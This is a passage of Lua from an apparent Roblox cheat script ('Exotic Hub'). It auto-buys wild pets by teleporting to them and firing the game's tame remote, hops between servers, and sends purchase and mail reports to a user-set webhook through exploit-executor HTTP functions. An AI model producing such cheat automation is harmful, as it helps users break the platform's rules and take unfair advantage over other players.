		return Z.PetFinderPremium.GetOptionValues("Variant")
	end,
	GetRule = function(G)
		local V = Z.TotalControl.ResolvePetFinderRuleTotalControl(G)
		if V ~= nil then
			return V
		end
		local y = type(h.pet_finder_buy_list) == "table" and h.pet_finder_buy_list[G] or nil
		if type(y) ~= "table" then
			return nil
		end
		return {
			enabled = y.enabled == true;
			target = math.max(math.floor(tonumber(y.target) or 1), 1);
			sizes = Z.PetFinderPremium.CopyMap(y.sizes);
			variants = Z.PetFinderPremium.CopyMap(y.variants)
		}
	end,
	HasRule = function(G)
		return type(h.pet_finder_buy_list) == "table" and type(h.pet_finder_buy_list[G]) == "table"
	end;
	ResetPetRuntime = function(G)
		Z.PetFinderPremium.ExpectedCounts[G] = nil
		for V in pairs(Z.PetFinderPremium.Pets) do
			local y = V and (V.Parent and V:GetAttribute("PetName")) or nil
			if y == G then
				Z.PetFinderPremium.Attempts[V] = nil
				Z.PetFinderPremium.RetryAt[V] = nil
				Z.PetFinderPremium.Handled[V] = nil
			end
		end
	end;
	SetRule = function(G, V, j, i, c)
		if type(G) ~= "string" or G == "" or type(y.PetData) ~= "table" or not y.PetData[G] then
			return false
		end
		V = math.max(math.floor(tonumber(V) or 0), 0)
		if V <= 0 then
			return false
		end
		if type(h.pet_finder_buy_list) ~= "table" then
			h.pet_finder_buy_list = {}
		end
		h.pet_finder_buy_list[G] = {
			enabled = c == true;
			target = V;
			sizes = Z.PetFinderPremium.CopyMap(j);
			variants = Z.PetFinderPremium.CopyMap(i)
		}
		Z.PetFinderPremium.ResetPetRuntime(G)
		if c == true and Z.PetFinderPremium.ResetHopTimer then
			Z.PetFinderPremium.ResetHopTimer()
		end
		return true
	end,
	SetRuleEnabled = function(G, V)
		if not Z.PetFinderPremium.HasRule(G) then
			return false
		end
		h.pet_finder_buy_list[G].enabled = V == true
		Z.PetFinderPremium.ResetPetRuntime(G)
		if V == true and Z.PetFinderPremium.ResetHopTimer then
			Z.PetFinderPremium.ResetHopTimer()
		end
		return true
	end,
	GetActiveRuleNames = function()
		local G = {}
		if type(h.pet_finder_buy_list) ~= "table" then
			return G
		end
		for V in pairs(h.pet_finder_buy_list) do
			local y = Z.PetFinderPremium.GetRule(V)
			if y and y.enabled then
				table.insert(G, V)
			end
		end
		table.sort(G)
		return G
	end;
	PassesSelection = function(G, V)
		return type(G) ~= "table" or next(G) == nil or G[V] == true
	end;
	PetNameMatches = function(G, V)
		return G == V or Z.PetFinderPremium.GetDisplayName(G) == V
	end,
	CountOwnedRaw = function(G, V)
		local y = 0
		if type(V) ~= "table" then
			return y
		end
		for j, i in pairs(Z.PetFinderPremium.GetInventoryPets()) do
			if type(i) ~= "table" then
				continue
			end
			local c = i.Name or i.PetName or i.Species
			local J = Z.PetFinderPremium.GetSize(i.Size)
			local T = Z.PetFinderPremium.GetVariant(i.Type)
			if type(c) == "string" and (Z.PetFinderPremium.PetNameMatches(G, c) and (Z.PetFinderPremium.PassesSelection(V.sizes, J) and Z.PetFinderPremium.PassesSelection(V.variants, T))) then
				y += 1
			end
		end
		return y
	end,
	CountOwnedForRule = function(G, V)
		local y = Z.PetFinderPremium.CountOwnedRaw(G, V)
		local j = Z.PetFinderPremium.ExpectedCounts[G]
		if type(j) ~= "table" or os.clock() >= ((tonumber(j.expiresAt) or 0)) then
			Z.PetFinderPremium.ExpectedCounts[G] = nil
			return y
		end
		if y >= ((tonumber(j.count) or 0)) then
			Z.PetFinderPremium.ExpectedCounts[G] = nil
			return y
		end
		return math.max(y, tonumber(j.count) or 0)
	end,
	HasReachedTarget = function(G, V)
		return Z.PetFinderPremium.CountOwnedForRule(G, V) >= V.target
	end;
	GetPetData = function(G)
		if not G or not G.Parent or not G:IsA("BasePart") then
			return nil
		end
		local V = G:GetAttribute("PetName")
		if type(V) ~= "string" or V == "" then
			return nil
		end
		local y = tonumber(G:GetAttribute("SpawnedAt")) or 0
		local j = tonumber(G:GetAttribute("Lifetime")) or 0
		return {
			ref = G;
			id = G.Name,
			name = V,
			displayName = Z.PetFinderPremium.GetDisplayName(V),
			size = Z.PetFinderPremium.GetSize(G:GetAttribute("PetSize")),
			variant = Z.PetFinderPremium.GetVariant(G:GetAttribute("PetType")),
			rarity = Z.PetFinderPremium.GetRarity(V, G:GetAttribute("Rarity")),
			price = math.max(tonumber(G:GetAttribute("Price")) or 0, 0),
			ownerId = tonumber(G:GetAttribute("OwnerUserId")) or 0,
			expiresAt = y > 0 and (j > 0 and y + j) or 0
		}
	end,
	IsExpired = function(G)
		return G.expiresAt > 0 and Z.PetFinderPremium.GetServerTime() >= G.expiresAt
	end,
	DisconnectFolder = function()
		for G, V in ipairs(Z.PetFinderPremium.FolderConnections) do
			pcall(function()
				V:Disconnect()
			end)
		end
		table.clear(Z.PetFinderPremium.FolderConnections)
	end;
	GetFolder = function()
		local G = y.Workspace:FindFirstChild("Map")
		local V = G and G:FindFirstChild("WildPetRef")
		return V and (V:IsA("Folder") and V) or nil
	end;
	BindFolder = function(G)
		if Z.PetFinderPremium.Folder == G then
			return
		end
		Z.PetFinderPremium.DisconnectFolder()
		Z.PetFinderPremium.Folder = G
		table.clear(Z.PetFinderPremium.Pets)
		table.clear(Z.PetFinderPremium.Handled)
		table.clear(Z.PetFinderPremium.RetryAt)
		table.clear(Z.PetFinderPremium.Attempts)
		if not G then
			return
		end
		table.insert(Z.PetFinderPremium.FolderConnections, G.ChildAdded:Connect(function(G)
			if G:IsA("BasePart") then
				Z.PetFinderPremium.Pets[G] = true
				if g.PetFinderPremiumUi.RefreshValues then
					task.defer(g.PetFinderPremiumUi.RefreshValues)
				end
			end
		end))
		table.insert(Z.PetFinderPremium.FolderConnections, G.ChildRemoved:Connect(function(G)
			Z.PetFinderPremium.Pets[G] = nil
			Z.PetFinderPremium.Handled[G] = nil
			Z.PetFinderPremium.RetryAt[G] = nil
			Z.PetFinderPremium.Attempts[G] = nil
		end))
	end,
	FullScan = function()
		Z.PetFinderPremium.BindFolder(Z.PetFinderPremium.GetFolder())
		local G = Z.PetFinderPremium.Folder
		if G then
			for G, V in ipairs(G:GetChildren()) do
				if V:IsA("BasePart") then
					Z.PetFinderPremium.Pets[V] = true
				end
			end
			for V in pairs(Z.PetFinderPremium.Pets) do
				if typeof(V) ~= "Instance" or V.Parent ~= G then
					Z.PetFinderPremium.Pets[V] = nil
					Z.PetFinderPremium.Handled[V] = nil
					Z.PetFinderPremium.RetryAt[V] = nil
					Z.PetFinderPremium.Attempts[V] = nil
				end
			end
		end
		if g.PetFinderPremiumUi.RefreshValues then
			g.PetFinderPremiumUi.RefreshValues()
		end
		if g.PetFinderPremiumUi.RefreshRules then
			g.PetFinderPremiumUi.RefreshRules()
		end
	end;
	PassesRule = function(G, V)
		if not V or not V.enabled or G.ownerId ~= 0 or Z.PetFinderPremium.IsExpired(G) then
			return false
		end
		local y = Z.TotalControl.PassesPetFinderAvoidTotalControl(G)
		if y == false then
			return false
		end
		local j = Z.TotalControl.ResolvePetFinderReachedTargetTotalControl(G, V)
		if not Z.PetFinderPremium.PassesSelection(V.sizes, G.size) or not Z.PetFinderPremium.PassesSelection(V.variants, G.variant) or (j ~= nil and j == true) or (j == nil and Z.PetFinderPremium.HasReachedTarget(G.name, V)) then
			return false
		end
		return ((tonumber(Z.Money.GetSheckles()) or 0)) >= G.price
	end;
	GetCandidate = function()
		local G
		local V = 0
		local y = os.clock()
		local j = Z.PetFinderPremium.SizeRanks
		local i = Z.PetFinderPremium.VariantRanks
		for c in pairs(Z.PetFinderPremium.Pets) do
			if Z.PetFinderPremium.Handled[c] or ((tonumber(Z.PetFinderPremium.Attempts[c]) or 0)) >= Z.PetFinderPremium.MaxAttempts or y < ((tonumber(Z.PetFinderPremium.RetryAt[c]) or 0)) then
				continue
			end
			local J = Z.PetFinderPremium.GetPetData(c)
			local T = J and Z.PetFinderPremium.GetRule(J.name) or nil
			if J and Z.PetFinderPremium.PassesRule(J, T) then
				V += 1
				if not G then
					G = J
				else
					local V = Z.TotalControl.ResolvePetCandidateScoreTotalControl(G)
					local y = Z.TotalControl.ResolvePetCandidateScoreTotalControl(J)
					if V ~= nil and y ~= nil then
						if y > V or y == V and tostring(J.id) < tostring(G.id) then
							G = J
						end
					else
						local V = j[G.size] or 100
						local y = j[J.size] or 100
						local Z = i[G.variant] or 100
						local c = i[J.variant] or 100
						if y < V or y == V and c < Z or y == V and (c == Z and tostring(J.id) < tostring(G.id)) then
							G = J
						end
					end
				end
			end
		end
		return G, V
	end,
	GetTrackedCount = function()
		local G = 0
		for V in pairs(Z.PetFinderPremium.Pets) do
			G += 1
		end
		return G
	end;
	AddPurchaseLog = function(G)
		local V = Z.TotalControl.AddPetPurchaseLogTotalControl(G)
		if V ~= nil then
			if g.PetFinderPremiumUi.RefreshLog then
				g.PetFinderPremiumUi.RefreshLog()
			end
			return
		end
		if type(h.pet_finder_purchase_log) ~= "table" then
			h.pet_finder_purchase_log = {}
		end
		table.insert(h.pet_finder_purchase_log, 1, {
			pet = G.name,
			display_name = G.displayName;
			size = G.size,
			variant = G.variant;
			rarity = G.rarity,
			price = G.price,
			purchased_at = os.time()
		})
		while # h.pet_finder_purchase_log > 10 do
			table.remove(h.pet_finder_purchase_log)
		end
		a.Save.SaveDataSync()
		if g.PetFinderPremiumUi.RefreshLog then
			g.PetFinderPremiumUi.RefreshLog()
		end
	end,
	QueueWebhook = function(G)
		if not h.webhook_pet_buys or type(G) ~= "table" then
			return false
		end
		return Z.Webhooks.Queue(g.PetFinder_WebhookData, {
			event = "pet_purchase",
			pet = G.name;
			display_name = G.displayName,
			size = G.size,
			variant = G.variant;
			rarity = G.rarity,
			price = tonumber(G.price) or 0,
			sheckles = tonumber(Z.Money.GetSheckles()) or 0;
			purchased_at = os.time();
			username = y.LocalPlayer and y.LocalPlayer.Name or "Unknown"
		})
	end,
	ConfirmPurchase = function(G)
		local V = Z.PetFinderPremium.Pending
		if not V or V.confirmed then
			return false
		end
		V.confirmed = true
		V.reason = tostring(G or "Confirmed")
		Z.PetFinderPremium.Handled[V.ref] = true
		local y = Z.TotalControl.ResolvePetFinderExpectedCountTotalControl(V.data)
		if y ~= false then
			Z.PetFinderPremium.ExpectedCounts[V.data.name] = {
				count = V.countBefore + 1;
				expiresAt = os.clock() + 20
			}
		end
		Z.PetFinderPremium.AddPurchaseLog(V.data)
		Z.PetFinderPremium.QueueWebhook(V.data)
		if Z.PetTriggersV2 and type(Z.PetTriggersV2.StopPetBuyPetTriggersV2) == "function" then
			Z.PetTriggersV2.StopPetBuyPetTriggersV2(V.petTriggerToken, "Purchase confirmed")
		end
		Z.PetFinderPremium.ResetHopTimer()
		if g.PetFinderPremiumUi.RefreshRules then
			g.PetFinderPremiumUi.RefreshRules()
		end
		return true
	end;
	BuyPet = function(G)
		if Z.PetFinderPremium.Busy or type(G) ~= "table" then
			return false
		end
		local V = G.ref
		local j = Z.PetFinderPremium.GetRule(G.name)
		local i = y.Networking and (y.Networking.Pets and y.Networking.Pets.WildPetTame)
		if not V or not V.Parent or not j or not Z.PetFinderPremium.PassesRule(G, j) or not i or type(i.Fire) ~= "function" then
			return false
		end
		local c = g.TeleportLockNames.PetFinderPremium
		local J = Z.TotalControl.ResolvePetFinderUseWalkTotalControl()
		if J == nil then
			J = h.garden_items_use_player_walk == true
		end
		local T = 6
		if J then
			T = g.PetAndSeedTravelTimeoutSeconds + 2
		end
		if not Z.Teleport.LockTeleport(c, T, J == true) then
			return false
		end
		Z.PetFinderPremium.Busy = true
		Z.PetFinderPremium.SetStatus("Buying " .. Z.PetFinderPremium.GetPetLabel(G.size, G.variant, G.displayName), "#66CCFF")
		local d = nil
		if Z.PetTriggersV2 and type(Z.PetTriggersV2.StartPetBuyPetTriggersV2) == "function" then
			d = Z.PetTriggersV2.StartPetBuyPetTriggersV2(G, V)
		end
		local u
		if J then
			u = Z.Movement.WalkPathToTarget(V, g.PetAndSeedTravelTimeoutSeconds, c, 10)
		else
			u = Z.TargetPivotTeleport.ToTargetAboveTargetPivotTeleport(V, c)
		end
		if not u then
			if Z.PetTriggersV2 and type(Z.PetTriggersV2.StopPetBuyPetTriggersV2) == "function" then
				Z.PetTriggersV2.StopPetBuyPetTriggersV2(d, "Pet move failed")
			end
			Z.PetFinderPremium.Busy = false
			Z.Teleport.UnlockTeleport(c)
			return false
		end
		task.wait(.2)
		G = Z.PetFinderPremium.GetPetData(V)
		j = G and Z.PetFinderPremium.GetRule(G.name) or nil
		if not G or not j or not Z.PetFinderPremium.PassesRule(G, j) then
			if Z.PetTriggersV2 and type(Z.PetTriggersV2.StopPetBuyPetTriggersV2) == "function" then
				Z.PetTriggersV2.StopPetBuyPetTriggersV2(d, "Pet no longer available")
			end
			Z.PetFinderPremium.Busy = false
			Z.Teleport.UnlockTeleport(c)
			return false
		end
		local q = {
			ref = V;
			data = G,
			countBefore = Z.PetFinderPremium.CountOwnedForRule(G.name, j);
			startedAt = os.clock(),
			confirmed = false;
			petTriggerToken = d
		}
		Z.PetFinderPremium.Pending = q
		Z.PetFinderPremium.Attempts[V] = ((tonumber(Z.PetFinderPremium.Attempts[V]) or 0)) + 1
		local E = Z.TargetPivotTeleport.StickToTargetUntilTargetPivotTeleport(V, c, {
			TimeoutTargetPivotTeleport = Z.PetFinderPremium.ConfirmTimeout,
			RefreshIntervalTargetPivotTeleport = .15,
			ActionIntervalTargetPivotTeleport = .25,
			RepeatActionTargetPivotTeleport = true,
			ValidateTargetPivotTeleport = function(G)
				if not Z.PetFinderPremium.IsEnabled() or not G or not G.Parent then
					return false
				end
				local V = tonumber(G:GetAttribute("OwnerUserId")) or 0
				return V == 0 or V == tonumber(g.player_userid)
			end,
			DoneTargetPivotTeleport = function(G)
				if q.confirmed or not Z.PetFinderPremium.IsEnabled() then
					return true
				end
				if not G or not G.Parent then
					return true
				end
				local V = tonumber(G:GetAttribute("OwnerUserId")) or 0
				if V == tonumber(g.player_userid) then
					Z.PetFinderPremium.ConfirmPurchase("Ownership confirmed")
					return true
				end
				return V ~= 0
			end;
			ActionTargetPivotTeleport = function(G)
				if not G or not G.Parent then
					return false
				end
				local V = tonumber(G:GetAttribute("OwnerUserId")) or 0
				if V ~= 0 then
					return false
				end
				i:Fire(G)
				return true
			end
		})
		local a = q.confirmed
		if a then
			local V = Z.PetFinderPremium.CountOwnedForRule(G.name, j)
			Z.PetFinderPremium.SetStatus(string.format("Purchased %s | %d/%d", Z.PetFinderPremium.GetPetLabel(G.size, G.variant, G.displayName), V, j.target), "#7CFC00")
		elseif Z.PetFinderPremium.IsEnabled() then
			local y = tonumber(Z.PetFinderPremium.Attempts[V]) or 0
			if y >= Z.PetFinderPremium.MaxAttempts then
				Z.PetFinderPremium.Handled[V] = true
				Z.PetFinderPremium.SetStatus("Stopped retrying: " .. G.displayName, "#FFCC66")
			else
				Z.PetFinderPremium.RetryAt[V] = os.clock() + 5
				Z.PetFinderPremium.SetStatus("Purchase not confirmed: " .. G.displayName, "#FFCC66")
			end
		end
		if not a and (Z.PetTriggersV2 and type(Z.PetTriggersV2.StopPetBuyPetTriggersV2) == "function") then
			Z.PetTriggersV2.StopPetBuyPetTriggersV2(d, "Pet buy ended")
		end
		Z.PetFinderPremium.Pending = nil
		Z.PetFinderPremium.Busy = false
		Z.Teleport.UnlockTeleport(c)
		return a
	end;
	IsEnabled = function()
		local G = Z.TotalControl.ResolvePetFinderEnabledTotalControl()
		if G ~= nil then
			return G == true
		end
		return h.pet_finder_enabled == true
	end;
	IsAutoHopEnabled = function()
		local G = Z.TotalControl.ResolvePetFinderAutoHopTotalControl()
		if G ~= nil then
			return G == true
		end
		return h.pet_finder_auto_hop == true
	end,
	GetHopMinutes = function()
		return math.max(math.floor(tonumber(h.pet_finder_hop_minutes) or 5), 1)
	end,
	ResetHopTimer = function()
		Z.PetFinderPremium.NextHopAt = os.clock() + Z.PetFinderPremium.GetHopMinutes() * 60
	end;
	GetHopRemaining = function()
		if Z.PetFinderPremium.NextHopAt <= 0 then
			Z.PetFinderPremium.ResetHopTimer()
		end
		return math.max(math.ceil(Z.PetFinderPremium.NextHopAt - os.clock()), 0)
	end,
	FormatTime = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		return string.format("%dm %02ds", math.floor(G / 60), G % 60)
	end,
	HasUnmetTargets = function()
		for G, V in ipairs(Z.PetFinderPremium.GetActiveRuleNames()) do
			local y = Z.PetFinderPremium.GetRule(V)
			if y and not Z.PetFinderPremium.HasReachedTarget(V, y) then
				return true
			end
		end
		return false
	end,
	UpdateIdle = function(G)
		local V = Z.PetFinderPremium.GetTrackedCount()
		if not Z.PetFinderPremium.IsAutoHopEnabled() then
			Z.PetFinderPremium.SetStatus(string.format("Monitoring %d pet%s | %d ready", V, V == 1 and "" or "s", G or 0), "#CFCFCF")
			return
		end
		local y = Z.PetFinderPremium.GetHopRemaining()
		if y > 0 then
			Z.PetFinderPremium.SetStatus(string.format("Monitoring %d pet%s | Hop in %s", V, V == 1 and "" or "s", Z.PetFinderPremium.FormatTime(y)), "#FFD966")
			return
		end
		local j = g.TeleportLockNames.PetFinderPremium
		if Z.Teleport.IsLocked(j) then
			Z.PetFinderPremium.SetStatus("Hop ready | Waiting for teleport", "#FFCC66")
			return
		end
		Z.PetFinderPremium.SetStatus("Hopping to a new server...", "#66CCFF")
		Z.PetFinderPremium.ResetHopTimer()
		s.Hop.HopToNewServer()
	end;
	Loop = function()
		if not g.GetCheckIfPro() then
			return
		end
		if os.clock() >= Z.PetFinderPremium.NextScanAt then
			Z.PetFinderPremium.NextScanAt = os.clock() + Z.PetFinderPremium.ScanDelay
			Z.PetFinderPremium.FullScan()
		end
		local G = Z.TotalControl.ResolvePetFinderEnabledTotalControl()
		if not Z.PetFinderPremium.IsEnabled() then
			Z.PetFinderPremium.ClearStatus()
			return
		end
		if G == nil then
			if # Z.PetFinderPremium.GetActiveRuleNames() == 0 then
				Z.PetFinderPremium.SetStatus("Paused: add an enabled pet rule", "#FFCC66")
				return
			end
			if not Z.PetFinderPremium.HasUnmetTargets() then
				Z.PetFinderPremium.SetStatus("All pet targets reached", "#7CFC00")
				return
			end
		end
		if Z.PetFinderPremium.Busy or Z.PetFinderPremium.Pending then
			return
		end
		local V, y = Z.PetFinderPremium.GetCandidate()
		if V then
			Z.PetFinderPremium.BuyPet(V)
		else
			Z.PetFinderPremium.UpdateIdle(y)
		end
	end;
	Start = function()
		if Z.PetFinderPremium.Started then
			return
		end
		Z.PetFinderPremium.Started = true
		Z.PetFinderPremium.ResetHopTimer()
		Z.PetFinderPremium.FullScan()
		local G = y.Networking and (y.Networking.Pets and y.Networking.Pets.WildPetTameResult)
		if G and G.OnClientEvent then
			G.OnClientEvent:Connect(function(G, V)
				local y = Z.PetFinderPremium.Pending
				if y and (y.ref == G and tonumber(V) == tonumber(g.player_userid)) then
					Z.PetFinderPremium.ConfirmPurchase("Tame result confirmed")
				end
			end)
		end
		task.spawn(function()
			while Z.PetFinderPremium.Started do
				task.wait(.5)
				if not g.GetCheckIfPro() then
					continue
				end
				local G, V = pcall(Z.PetFinderPremium.Loop)
				if not G then
					Z.PetFinderPremium.Busy = false
					Z.PetFinderPremium.Pending = nil
					Z.Teleport.UnlockTeleport(g.TeleportLockNames.PetFinderPremium)
					Z.PetFinderPremium.SetStatus("Error: pet finder loop failed", "#FF4444")
					warn("[PetFinderPremium]", V)
				end
			end
		end)
	end
}
g.WebhookStatusText = ""
Z.Webhooks = {
	EventSeedListenerStarted = false;
	EventSeedConnection = nil;
	SetStatus = function(G, V)
		G = tostring(G or "")
		if G == "" then
			g.WebhookStatusText = ""
			return
		end
		g.WebhookStatusText = string.format("<stroke color=\'#000000\' thickness=\'1\'><font color=\'#FFFFFF\'>\240\159\148\148 [Webhooks]</font> <font color=\'%s\'>%s</font></stroke>", tostring(V or "#FFFFFF"), G)
	end,
	ClearStatus = function()
		g.WebhookStatusText = ""
	end,
	IsMailTypeEnabled = function(G)
		if G == "manual" then
			return h.webhook_mail_manual == true
		end
		if G == "automatic" then
			return h.webhook_mail_auto == true
		end
		if G == "claim" then
			return h.webhook_mail_claims == true
		end
		return false
	end,
	RemoveMailType = function(G)
		if type(g.Mail_WebhookData) ~= "table" then
			return
		end
		for V = # g.Mail_WebhookData, 1, - 1 do
			local y = g.Mail_WebhookData[V]
			if type(y) ~= "table" or y.webhookType == G then
				table.remove(g.Mail_WebhookData, V)
			end
		end
	end;
	CopyMailItems = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in ipairs(G) do
			if type(y) ~= "table" then
				continue
			end
			local j = tostring(y.category or y.Category or "Unknown")
			local i = tostring(y.itemName or y.ItemName or y.name or y.ItemKey or "Unknown")
			local c = math.max(math.floor(tonumber(y.amount or y.count or y.Count or 1) or 1), 1)
			table.insert(V, {
				category = j;
				name = Z.Mail.GetItemDisplayName(j, i) .. Z.Mail.GetFruitFilterText(y),
				count = c
			})
		end
		return V
	end;
	QueueMail = function(G, V)
		if not h.webhook_enabled then
			return false
		end
		if not Z.Webhooks.IsMailTypeEnabled(G) or type(V) ~= "table" then
			return false
		end
		if type(g.Mail_WebhookData) ~= "table" then
			g.Mail_WebhookData = {}
		end
		V.webhookType = G
		V.queuedAt = os.time()
		return Z.Webhooks.Queue(g.Mail_WebhookData, V)
	end;
	QueueEventSeed = function(G, V)
		if not h.webhook_enabled or not h.webhook_event_seeds or tostring(G or "") ~= tostring(y.LocalPlayer.Name) then
			return false
		end
		V = tostring(V or "")
		if V ~= "Gold Seed" and V ~= "Rainbow Seed" then
			return false
		end
		return Z.Webhooks.Queue(g.EventSeed_WebhookData, {
			username = tostring(G);
			seed = V,
			queuedAt = os.time()
		})
	end,
	BuildEventSeedPayload = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = tostring(G.seed or "")
		if V ~= "Gold Seed" and V ~= "Rainbow Seed" then
			return nil
		end
		local Z = V == "Rainbow Seed"
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = Z and "\240\159\140\136 Rainbow Seed Claimed!" or "\240\159\159\161 Gold Seed Claimed!",
					description = Z and "A rare **Rainbow Seed** was collected successfully!" or "A rare **Gold Seed** was collected successfully!",
					color = Z and 16729559 or 16766720,
					fields = {
						{
							name = "\240\159\140\177 Seed";
							value = "**" .. (V .. "**");
							inline = true
						};
						{
							name = "\240\159\145\164 Account",
							value = "||@" .. (tostring(G.username or "Unknown") .. "||");
							inline = true
						}
					};
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end,
	StartEventSeedListener = function()
		if Z.Webhooks.EventSeedListenerStarted then
			return false
		end
		local G = y.Networking and (y.Networking.SeedPackSpawn and y.Networking.SeedPackSpawn.Claimed)
		if not G or not G.OnClientEvent then
			return false
		end
		Z.Webhooks.EventSeedListenerStarted = true
		Z.Webhooks.EventSeedConnection = G.OnClientEvent:Connect(function(G, V)
			Z.Webhooks.QueueEventSeed(G, V)
		end)
		return true
	end,
	TrimWebhookText = function(G, V)
		G = tostring(G or "")
		V = tonumber(V) or 1000
		if # G <= V then
			return G
		end
		return G:sub(1, V - 3) .. "..."
	end;
	StripWebhookRichText = function(G)
		G = tostring(G or "")
		G = G:gsub("<br%s*/?>", " ")
		G = G:gsub("<[^>]->", "")
		G = (G:gsub("&lt;", "<")):gsub("&gt;", ">")
		G = G:gsub("&amp;", "&")
		return G
	end,
	FormatMailCategoryWebhook = function(G)
		G = tostring(G or "")
		if G == "" or G == "Unknown" or G == "HarvestedFruits" then
			return ""
		end
		return " `" .. (G .. "`")
	end,
	BuildMailItemsText = function(G)
		local V = {}
		for G, y in ipairs(G or {}) do
			if type(y) ~= "table" then
				continue
			end
			local j = Z.Webhooks.StripWebhookRichText(y.name or "Unknown")
			local i = Z.Webhooks.FormatMailCategoryWebhook(y.category)
			table.insert(V, string.format("\226\128\162 **x%d %s**%s", math.max(math.floor(tonumber(y.count) or 1), 1), j, i))
		end
		if # V == 0 then
			return "No item details available"
		end
		return Z.Webhooks.TrimWebhookText(table.concat(V, "\n"), 1000)
	end;
	BuildClaimedMailText = function(G)
		local V = {}
		for G, y in ipairs(G or {}) do
			if type(y) ~= "table" then
				continue
			end
			local j = tostring(y.from or "Unknown")
			local i = type(y.items) == "table" and y.items or {}
			if # i == 0 then
				table.insert(V, "\226\128\162 From **@" .. (j .. "**"))
				continue
			end
			for G, y in ipairs(i) do
				local i = Z.Webhooks.StripWebhookRichText(y.name or "Unknown")
				local c = Z.Webhooks.FormatMailCategoryWebhook(y.category)
				table.insert(V, string.format("\226\128\162 **@%s** \226\134\146 x%d %s%s", j, math.max(math.floor(tonumber(y.count) or 1), 1), i, c))
			end
		end
		if # V == 0 then
			return "No item details available"
		end
		return Z.Webhooks.TrimWebhookText(table.concat(V, "\n"), 1000)
	end,
	BuildMailPayload = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = tostring(G.webhookType or "")
		local j
		local i
		local c
		local J = {}
		if V == "manual" then
			j = "\240\159\147\166 Manual Order Delivered!"
			i = "Your manual mailbox order was completed successfully."
			c = 5763719
			table.insert(J, {
				name = "\240\159\167\190 Order",
				value = tostring(G.orderId or "Unknown");
				inline = true
			})
			table.insert(J, {
				name = "\240\159\145\164 Recipient";
				value = "||@" .. (tostring(G.recipient or "Unknown") .. "||");
				inline = true
			})
			table.insert(J, {
				name = "\240\159\147\166 Items Delivered";
				value = Z.Webhooks.BuildMailItemsText(G.items);
				inline = false
			})
		elseif V == "automatic" then
			j = "\226\154\153\239\184\143 Automatic Mail Sent!"
			i = "An automatic mailbox rule completed successfully."
			c = 3447003
			table.insert(J, {
				name = "\226\154\153\239\184\143 Rule",
				value = tostring(G.ruleId or "Unknown");
				inline = true
			})
			table.insert(J, {
				name = "\240\159\145\164 Recipient";
				value = "||@" .. (tostring(G.recipient or "Unknown") .. "||"),
				inline = true
			})
			table.insert(J, {
				name = "\240\159\147\164 Items Sent",
				value = Z.Webhooks.BuildMailItemsText(G.items),
				inline = false
			})
		elseif V == "claim" then
			local V = math.max(math.floor(tonumber(G.count) or 0), 0)
			j = "\240\159\147\165 Incoming Mail Claimed!"
			i = string.format("Successfully claimed **%d** incoming mail%s.", V, V == 1 and "" or "s")
			c = 10181046
			table.insert(J, {
				name = "\240\159\147\172 Claim Type";
				value = tostring(G.mode or "Unknown");
				inline = true
			})
			table.insert(J, {
				name = "\226\156\133 Claimed";
				value = tostring(V);
				inline = true
			})
			table.insert(J, {
				name = "\240\159\142\129 Received Items";
				value = Z.Webhooks.BuildClaimedMailText(G.mails);
				inline = false
			})
		else
			return nil
		end
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = j;
					description = i,
					color = c,
					fields = J;
					footer = {
						text = tostring(y.AppName or "Exotic Hub") .. (" " .. tostring(y.CurentV or ""))
					};
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
			}
		}
	end,
	IsValidUrl = function(G)
		return type(G) == "string" and (G ~= "" and G:match("^https?://[^%s]+$") ~= nil)
	end,
	GetRequestFunction = function()
		local G = _G
		if type(getgenv) == "function" then
			local V, y = pcall(getgenv)
			if V and type(y) == "table" then
				G = y
			end
		end
		local V = {
			"request";
			"http_request",
			"httprequest",
			"httpRequest"
		}
		for V, y in ipairs(V) do
			if type(G[y]) == "function" then
				return G[y]
			end
		end
		local y = {
			"syn";
			"http";
			"fluxus",
			"krnl"
		}
		for V, y in ipairs(y) do
			local Z = G[y]
			if type(Z) == "table" and type(Z.request) == "function" then
				return Z.request
			end
		end
		return nil
	end;
	Queue = function(G, V)
		if not h.webhook_enabled then
			return false
		end
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		table.insert(G, V)
		return true
	end;
	GetPetBuyStyle = function(G, V, y, j)
		G = tostring(G or "Normal")
		V = tostring(V or "Normal")
		y = tostring(y or "Unknown")
		local i = Z.PetFinderPremium.GetPetLabel(G, V, y)
		local c = {
			title = "\240\159\144\190 You Bought a " .. (i .. "!"),
			message = "Pet purchase confirmed.";
			colour = j
		}
		if V == "Rainbow" and G == "Huge" then
			c.title = "\240\159\140\136 YOU BOUGHT A " .. (string.upper(i) .. " \240\159\145\145!")
			c.message = "Incredible find! A Huge Rainbow pet has been secured!"
			c.colour = 16729559
		elseif V == "Rainbow" and G == "Big" then
			c.title = "\240\159\140\136 You Bought a " .. (i .. " \226\156\168!")
			c.message = "Amazing find! A Big Rainbow pet has been secured!"
			c.colour = 12865023
		elseif G == "Huge" then
			c.title = "\240\159\145\145 YOU BOUGHT A " .. (string.upper(i) .. " \240\159\148\165!")
			c.message = "Massive find! A Huge pet has been secured!"
			c.colour = 16766720
		elseif V == "Rainbow" then
			c.title = "\240\159\140\136 You Bought a " .. (i .. " \226\156\168!")
			c.message = "Lucky find! A Rainbow pet has been secured!"
			c.colour = 16729559
		elseif G == "Big" then
			c.title = "\240\159\148\165 You Bought a " .. (i .. "!")
			c.message = "Great find! A Big pet has been secured!"
			c.colour = 16747586
		end
		return c
	end,
	BuildPetBuyPayload = function(G)
		if type(G) ~= "table" then
			return nil
		end
		local V = tostring(G.rarity or "Unknown")
		local j = Z.Data.GetRarityColor(V)
		local i = tonumber(((tostring(j)):gsub("#", "")), 16) or 5763719
		local c = tostring(G.size or "Normal")
		local J = tostring(G.variant or "Normal")
		local T = tostring(G.display_name or G.pet or "Unknown")
		local d = Z.PetFinderPremium.GetPetLabel(c, J, T)
		local u = Z.Webhooks.GetPetBuyStyle(c, J, T, i)
		return {
			username = "Exotic Hub",
			embeds = {
				{
					title = u.title;
